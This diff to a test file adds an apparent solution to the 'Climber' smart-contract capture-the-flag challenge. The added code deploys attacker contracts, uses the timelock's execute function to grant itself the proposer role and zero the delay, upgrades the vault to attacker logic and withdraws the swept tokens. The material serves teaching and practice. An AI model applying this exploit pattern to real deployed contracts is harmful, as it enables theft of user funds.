@@ -53,6 +53,50 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+	const hackVault = this.vault.connect(attacker);
+	const hackTimeLock = this.timelock.connect(attacker);
+	const hackToken = this.token.connect(attacker);
+
+	const AttackTimeLockFactory = await ethers.getContractFactory("AttackClimberTimelock",attacker);
+	const attackContract = await AttackTimeLockFactory.deploy(hackVault.address, hackTimeLock.address, hackToken.address, attacker.address);
+
+	const AttackVaultFactory = await ethers.getContractFactory("AttackClimberVault",attacker);
+	const attackVault = await AttackVaultFactory.deploy();
+
+	const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
+
+	const myInterface = (signature, methodName, myArguments) => {
+		const ABI = signature;
+		const IFace = new ethers.utils.Interface(ABI);
+		const ABIData = IFace.encodeFunctionData(methodName, myArguments);
+		return ABIData;
+	}
+
+	// set attacker contract as proposer for timelock
+	const setupRoleABI = ["function grantRole(bytes32 role, address account)"];
+	const grantRoleData = myInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, attackContract.address]);
+	// Update delay 
+	const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
+	const updateDelayData = myInterface(updateDelayABI, "updateDelay", [0]);
+	// Call to the vault to upgrade to attacker controlled contract logic
+	const upgradeABI = ["function upgradeTo(address newImplementation)"];
+	const upgradeData = myInterface(upgradeABI, "upgradeTo", [attackVault.address]);
+
+	// Call attacking contract to schedule these actions and sweep funds
+	const hackABI = ["function attack()"];
+	const hackData = myInterface(hackABI, "attack", undefined);
+
+	const toAddress = [hackTimeLock.address, hackTimeLock.address, hackVault.address, attackContract.address];
+	const data = [grantRoleData, updateDelayData, upgradeData, hackData];
+	// Set our 4 calls to attacking contract
+	await attackContract.setScheduleData(toAddress, data);
+	// Execute the 4 calls
+	await hackTimeLock.execute(toAddress, Array(data.length).fill(0), data, ethers.utils.hexZeroPad("0x00",32));
+	
+	// Withdraw our funds from attacking contract that we sweeped before
+	await attackContract.withdraw();
+
     });
 
     after(async function () {
